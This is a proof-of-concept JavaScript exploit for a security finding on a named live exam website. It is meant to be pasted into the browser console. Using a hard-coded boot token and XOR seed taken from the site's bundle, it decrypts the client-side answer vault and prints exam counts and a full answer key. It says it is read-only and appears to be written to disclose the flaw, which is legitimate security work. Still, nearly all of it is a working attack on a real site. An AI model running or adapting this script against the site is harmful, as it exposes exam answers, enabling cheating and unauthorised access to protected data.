// poc_f04_exam_answers.js — F-04: Exam answer exposure (DISPLAY-ONLY, read-only)
//
// Target:  https://trithuc500.vercel.app/
// Finding: F-04 — correct answers ship in the client bundle. V4.5 moved them
//           into a gzip + PRNG-XOR "vault", but the chunk seed and the vault
//           boot token are still literals in the delivered JavaScript.
// Type:     DISPLAY ONLY. Reads DOM/global data and decrypts locally.
//           Does NOT modify state, does NOT contact ntfy/KV, does NOT submit.
//
// Usage: paste into DevTools Console on the target page.
// Output: exam count, answer count and one answer key.

(async () => {
    'use strict';

    const BOOT_TOKEN = 'TT50_V45_INTERNAL_BOOT_SEAL'; // bundle literal
    const EXAM_SEED = 0x4F81E3A7;                     // shipped __decGzChunks seed

    // ---- 1. Reproduce the shipped PRNG-XOR chunk decoder locally. ---------
    function makeDecoder(seed) {
        return async function decodeGzChunks(chunks) {
            if (!Array.isArray(chunks) || !chunks.length) return '{}';
            if (typeof DecompressionStream === 'undefined' || typeof Response === 'undefined') {
                throw new Error('DecompressionStream unavailable in this context');
            }
            const parts = [];
            for (let ci = 0; ci < chunks.length; ci++) {
                const bin = atob(chunks[ci]);
                const buf = new Uint8Array(bin.length);
                let s = ((seed ^ Math.imul(ci + 1, 0x9E3779B1)) >>> 0) || 0x9E3779B9;
                const ks = new Uint8Array(4096);
                for (let k = 0; k < 4096; k++) {
                    s ^= (s << 13) >>> 0;
                    s ^= (s >>> 17);
                    s ^= (s << 5) >>> 0;
                    ks[k] = (s ^ ((k * 31) & 0xFF)) & 0xFF;
                }
                for (let i = 0; i < bin.length; i++) buf[i] = bin.charCodeAt(i) ^ ks[i & 4095];
                parts.push(buf);
            }
            const res = new Response(new Blob(parts).stream().pipeThrough(new DecompressionStream('gzip')));
            return await res.text();
        };
    }

    const decodeGzChunks = makeDecoder(EXAM_SEED);
    const recovered = [];

    // ---- 2a. Preferred V4.5 path: claim the vault with the literal token. --
    try {
        if (typeof window.__TT50_CLAIM_VAULT_V45__ === 'function') {
            const vault = window.__TT50_CLAIM_VAULT_V45__(BOOT_TOKEN);
            if (vault && Array.isArray(vault.initialExams) && vault.initialExams.length) {
                vault.initialExams.forEach(e => recovered.push({ source: 'vault claim', e }));
            }
        }
    } catch (e) { /* already claimed or unavailable — fall through to the blob */ }

    // ---- 2b. Decode the gzip vault blob directly from the shipped script. -
    if (!recovered.length) {
        try {
            const scripts = Array.from(document.querySelectorAll('script')).map(s => s.textContent || '');
            const blobScript = scripts.find(t => t.includes('var __ENC_GZ = '));
            if (blobScript) {
                const from = blobScript.indexOf('var __ENC_GZ = ') + 'var __ENC_GZ = '.length;
                const to = blobScript.indexOf(';', from);
                const enc = JSON.parse(blobScript.slice(from, to));
                if (Array.isArray(enc.exams) && enc.exams.length) {
                    const exams = JSON.parse(await decodeGzChunks(enc.exams));
                    exams.forEach(e => recovered.push({ source: 'gzip vault', e }));
                }
            }
        } catch (e) { console.warn('[F-04] gzip vault decode failed:', e && e.message); }
    }

    // ---- 2c. Legacy fallbacks (older builds kept plaintext / XOR payloads). -
    try {
        const legacy = window.__INITIAL_EXAMS_DATA__;
        if (Array.isArray(legacy)) legacy.forEach(e => recovered.push({ source: '__INITIAL_EXAMS_DATA__', e }));
    } catch (e) { /* ignore */ }

    // ---- 3. Report --------------------------------------------------------
    function answerCount(e) {
        const ca = e && (e.correctAnswers || e.answers);
        if (!ca || typeof ca !== 'object') return 0;
        return ['p1', 'p2', 'p3', 'p4'].reduce((n, p) => n + Object.keys(ca[p] || {}).length, 0);
    }

    let total = 0;
    const rows = recovered.map(r => {
        const n = answerCount(r.e);
        total += n;
        return {
            exam: String((r.e && (r.e.title || r.e.id)) || '').slice(0, 42),
            answers: n,
            source: r.source
        };
    });

    console.log('=== F-04 Exam answer exposure (READ-ONLY) ===');
    console.log(`exams recovered: ${recovered.length}`);
    console.log(`correct-answer entries: ${total}`);
    if (rows.length) console.table(rows);
    if (total > 0) console.warn('[F-04] CONFIRMED: correct answers are readable client-side before submission.');

    const first = recovered.find(r => answerCount(r.e) > 0);
    if (first) {
        console.log(`\n--- Full answer key: ${first.e.title || first.e.id} ---`);
        console.log(JSON.stringify(first.e.correctAnswers || first.e.answers, null, 1));
    }

    return {
        exams: recovered.length,
        answers: total,
        verdict: total > 0 ? 'F-04 CONFIRMED (read-only)' : 'not observed',
        impact: 'Answers are client-side. Grading is client-side. A student can read the key before submitting.'
    };
})();
